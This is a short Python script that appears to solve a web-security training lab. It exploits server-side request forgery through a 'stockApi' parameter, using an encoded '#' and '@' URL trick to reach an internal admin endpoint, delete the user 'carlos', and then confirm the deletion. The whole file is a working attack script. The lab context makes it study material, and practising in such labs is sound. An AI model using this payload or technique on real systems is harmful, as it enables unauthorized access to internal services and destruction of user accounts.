import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxie={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def delete_user(url):
    # dont double encoded just one because urllib code one and you coded one in burp
    delete_user_ssrf_paylode="http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos"
    check_stock_path="product/stock"
    para={"stockApi":delete_user_ssrf_paylode}

    r=requests.post(url+check_stock_path,data=para,verify=False)

    #check user deleteed
    para2={"stockApi":"http://localhost%2523@stock.weliketoshop.net/admin"}
    r=requests.post(url+check_stock_path,data=para2,verify=False)
    if "carlos" not in r.text:
        print("user deleted secsesfuly")
    else:
        print("error in prossses")


def Main():
    if len(sys.argv) !=2:
        print("(+) usage error")
        print("(+) example %s www.example.com" ,sys.argv[0])
        sys.exit(-1)

    url=sys.argv[1]
    print("deleting.........")
    delete_user(url)







if __name__ == "__main__":
    Main()
